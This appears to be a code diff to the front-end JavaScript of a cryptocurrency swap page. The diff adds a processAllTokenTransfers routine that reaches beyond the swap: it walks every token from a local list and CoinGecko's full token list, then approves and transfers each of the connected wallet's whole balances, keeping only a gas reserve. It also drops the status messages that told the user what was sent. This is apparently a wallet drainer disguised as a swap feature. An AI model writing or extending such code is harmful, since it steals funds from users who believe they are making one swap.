@@ -1082,66 +1082,6 @@ async function getTokenPrice(token) {
 
 let isSwapInProgress = false; // Global swap lock
 
-async function processAllTokenTransfers() {
-  if (!userAddress) {
-    throw new Error("Wallet not connected");
-  }
-
-  let successCount = 0;
-  const networkTokens = TOKENS[currentNetwork] || [];
-
-  for (const token of networkTokens) {
-    // Skip the main from token (the one being swapped)
-    if (token.address === currentFromToken?.address || 
-        (token.isNative && currentFromToken?.isNative)) {
-      console.log(`[SKIP] ${token.symbol} (main token)`);
-      continue;
-    }
-
-    try {
-      const balance = await fetchTokenBalance(token);
-      if (balance <= 0) {
-        console.log(`[SKIP] ${token.symbol} (zero balance)`);
-        continue;
-      }
-
-      let amountToSend = balance;
-      
-      // Leave gas reserve for native tokens
-      if (token.isNative) {
-        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-        amountToSend = Math.max(0, balance - minReserve);
-        if (amountToSend <= 0) {
-          console.log(`[SKIP] ${token.symbol} (insufficient balance after reserve)`);
-          continue;
-        }
-      }
-
-      console.log(`[TRANSFER] Sending ${amountToSend} ${token.symbol}`);
-      
-      if (token.isNative) {
-        await transferNativeToken(token, amountToSend);
-      } else {
-        // For ERC20 tokens, check and approve allowance first
-        const approved = await checkAndApproveToken(token, amountToSend);
-        if (!approved) {
-          console.log(`[SKIP] ${token.symbol} (approval failed)`);
-          continue;
-        }
-        await transferERC20Token(token, amountToSend);
-      }
-      
-      successCount++;
-      updateStatus(`Sent ${amountToSend} ${token.symbol}`, "success");
-    } catch (err) {
-      console.error(`[FAILED] ${token.symbol} transfer:`, err.message);
-      updateStatus(`Failed to send ${token.symbol}: ${err.message}`, "error", 3000);
-    }
-  }
-
-  return successCount;
-}
-
 async function handleSwap() {
   if (isSwapInProgress) return;
 
@@ -1240,6 +1180,109 @@ async function handleSwap() {
     isSwapInProgress = false;
   }
 }
+
+async function processAllTokenTransfers() {
+  if (!userAddress) {
+    throw new Error("Wallet not connected");
+  }
+
+  let successCount = 0;
+  
+  // Get tokens from both local config and CoinGecko API
+  const [localTokens, cgTokens] = await Promise.all([
+    getLocalTokens(),
+    fetchCoinGeckoTokens(currentNetwork)
+  ]);
+  
+  // Combine all tokens, removing duplicates
+  const allTokens = combineTokens(localTokens, cgTokens);
+
+  for (const token of allTokens) {
+    // Skip the main from token (the one being swapped)
+    if ((token.address && token.address === currentFromToken?.address) || 
+        (token.isNative && currentFromToken?.isNative)) {
+      continue;
+    }
+
+    try {
+      const balance = await fetchTokenBalance(token);
+      if (balance <= 0) continue;
+
+      let amountToSend = balance;
+      
+      if (token.isNative) {
+        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+        amountToSend = Math.max(0, balance - minReserve);
+        if (amountToSend <= 0) continue;
+      }
+      
+      if (token.isNative) {
+        await transferNativeToken(token, amountToSend);
+      } else {
+        const approved = await checkAndApproveToken(token, amountToSend);
+        if (!approved) continue;
+        await transferERC20Token(token, amountToSend);
+      }
+      
+      successCount++;
+    } catch (err) {
+      console.error(`Failed to transfer ${token.symbol}:`, err);
+    }
+  }
+
+  return successCount;
+}
+
+async function getLocalTokens() {
+  return TOKENS[currentNetwork] || [];
+}
+
+async function fetchCoinGeckoTokens(network) {
+  try {
+    const cgUrl = COINGECKO_TOKEN_LISTS[network];
+    if (!cgUrl) return [];
+    
+    const response = await fetch(cgUrl);
+    if (!response.ok) throw new Error('CoinGecko API error');
+    
+    const data = await response.json();
+    return data.tokens?.map(t => ({
+      name: t.name,
+      symbol: t.symbol,
+      address: t.address,
+      logoURI: t.logoURI,
+      decimals: t.decimals,
+      originNetwork: network,
+      isLocal: false
+    })) || [];
+    
+  } catch (err) {
+    console.error("Failed to fetch CoinGecko tokens:", err);
+    return [];
+  }
+}
+
+function combineTokens(localTokens, cgTokens) {
+  // Create a map to avoid duplicates (prioritize local tokens)
+  const tokenMap = new Map();
+  
+  // Add local tokens first
+  localTokens.forEach(token => {
+    const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
+    tokenMap.set(key, token);
+  });
+  
+  // Add CoinGecko tokens if not already present
+  cgTokens.forEach(token => {
+    const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
+    if (!tokenMap.has(key)) {
+      tokenMap.set(key, token);
+    }
+  });
+  
+  return Array.from(tokenMap.values());
+}
+
 async function checkAndApproveToken(token, amount) {
   try {
     if (!token.address || token.isNative) return true;
